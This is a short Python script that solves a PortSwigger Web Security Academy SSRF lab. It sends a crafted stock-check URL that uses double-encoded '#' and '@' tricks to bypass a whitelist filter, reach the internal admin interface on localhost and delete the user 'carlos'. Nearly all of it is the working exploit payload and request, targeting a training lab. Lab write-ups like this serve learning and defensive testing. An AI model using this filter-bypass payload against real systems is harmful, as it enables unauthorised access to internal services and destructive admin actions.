#!/usr/bin/env python

'''
This lab has a stock check feature which fetches data from an internal system.
To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
The developer has deployed an anti-SSRF defense you will need to bypass.

Lab link: https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter
'''

import requests


lab_id = '0ab200be04e06dc5801c49690042000b' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"

# Defeats whitelist for stock.weliketoshop.net: %2523 = '#' for fragmenting url (via double decoding on the server end) and @ accepted by whitelist before domain address
# (Note: in order to replicate in the request module I used %23, so the request will url encode the '%' to '%25' then and 23 to simulate the %2523 above)
data = {'stockApi': 'http://localhost:80%23@stock.weliketoshop.net/admin/delete?username=carlos'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")
